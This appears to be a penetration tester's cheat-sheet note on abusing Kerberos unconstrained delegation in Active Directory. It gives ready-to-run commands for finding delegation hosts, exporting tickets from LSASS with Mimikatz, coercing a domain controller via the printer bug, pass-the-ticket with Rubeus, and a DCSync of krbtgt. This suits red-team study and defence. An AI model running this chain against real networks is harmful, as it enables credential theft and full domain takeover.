---
tags:
  - privesc
title:
  - Unconstrained Delegation
---
#### Introduction

- When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user.
- When unconstrained delegation is enabled, the DC places user's TGT inside TGS. When it is presented to the server, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user.
- This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine.

```powershell title:"Discover domain computers which have unconstrained delegation using PowerView"
Get-DomainComputer -UnConstrained
```

```powershell title:"Discover domain computers or users which have unconstrained delegation enabled using ActiveDirectory module"
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedForDelegation -eq $true}
```

After compromising the server where Unconstrained delegation is enabled, we must trick or wait for a domain admin to connect a service on the application server.

```powershell title:"Get the TGT from LSASS after Domain Admin has logged in"
Invoke-MimiKatz -Command '"sekurlsa::tickets /export"'
```

```powershell title:"Re-use the Domain Admin's TGT by Pass-The-Ticket"
Invoke-MimiKatz -Command '"kerberos::ptt C:\path\to\ticket.kirbi"'
```

#### Printer Bug

- This is a method to trick a high privilege user to connect to a machine with Unconstrained Delegation.
- A feature of MS-RPRN (Microsoft-Print System Remote Control) which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to a second machine of the domain user's choice.

```batch title:"Sniff the TGT of the high privileged account in the machine where Unconstrained Delegation is enabled"
Rubeus.exe monitor /interval:5 /nowrap
```

```batch title:"Use MS-RPRN to make the high privileged account (in DC) connect to the machine with Unconstrained Delegation enabled"
MS-RPRN.exe \\domain-controller-fqdn \\unconstrained-delegation-enabled-fqdn
```

In Rubeus, the base64 TGT will appear

```batch title:"Pass-The-Ticket on your initial foothold"
Rubeus.exe ptt /ticket:<base64_tgt>
```

```powershell title:"Try DCSync once the ticket is injected"
Invoke-MimiKatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

This attack can work across forests if TGT delegation is enabled.


